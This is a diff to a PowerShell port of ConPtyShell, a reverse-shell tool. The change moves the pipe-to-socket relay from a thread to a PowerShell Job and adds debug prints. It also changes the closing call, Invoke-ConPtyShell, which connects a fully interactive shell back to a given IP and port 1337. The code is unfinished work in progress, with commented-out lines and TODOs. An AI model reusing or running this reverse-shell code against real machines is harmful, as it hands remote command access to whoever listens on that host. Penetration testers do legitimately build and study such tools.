@@ -1053,7 +1053,7 @@ class ConPtyShell {
     # }
 
     #hidden static [System.Threading.Thread] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
-    hidden static [void] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
+    hidden static [System.Management.Automation.Job] StartThreadReadPipeWriteSocket([IntPtr] $OutputPipeRead, [IntPtr] $shellSocket, [bool] $overlappedSocket)
     {
         $ThreadReadPipeWriteSocketOverlapped = {
             param($OutputPipeRead, $shellSocket)
@@ -1077,13 +1077,14 @@ class ConPtyShell {
             $job = $null
             Write-Host "Domache"
         }
-        Wait-Job $job
-        Receive-Job $job
-        Get-Job $job
+
+        Write-Host "job: " $job.GetType()
+
         # Wait-Job $job
-#            thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocketNonOverlapped);
-#        thThreadReadPipeWriteSocket.Start(threadParameters);
-#        return thThreadReadPipeWriteSocket;
+        # Receive-Job $job
+        # Get-Job $job
+
+        return $job
     }
 
     static [string] SpawnConPtyShell([string] $remoteIp, [uint32] $remotePort, [uint32] $rows, [uint32] $cols, [string] $commandLine, [bool] $upgradeShell) {
@@ -1170,9 +1171,11 @@ class ConPtyShell {
                 Write-Host "Todo!" -ForegroundColor Yellow # TODO
             }
         }
-        # Thread have better perfornace than Tasks
-        [System.Threading.Thread] $thThreadReadPipeWriteSocket = [ConPtyShell]::StartThreadReadPipeWriteSocket($OutputPipeRead, $shellSocket, $IsSocketOverlapped)
-
+        # Let's use Job, it seems easier than dealing with Threads in Powershell
+        [System.Management.Automation.Job] $thThreadReadPipeWriteSocket = [ConPtyShell]::StartThreadReadPipeWriteSocket($OutputPipeRead, $shellSocket, $IsSocketOverlapped)
+        #[System.Management.Automation.Job] $thThreadReadSocketWritePipe = [ConPtyShell]::StartThreadReadSocketWritePipe($InputPipeWrite, $shellSocket, $childProcessInfo.hProcess, $IsSocketOverlapped)
+        
+        # wait for the child process until exit
 
 
         $LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -1439,4 +1442,4 @@ function Invoke-ConPtyShell
     Write-Output $output
 }
 
-Invoke-ConPtyShell '192.168.56.1' 1337
+Invoke-ConPtyShell '127.0.0.1' 1337
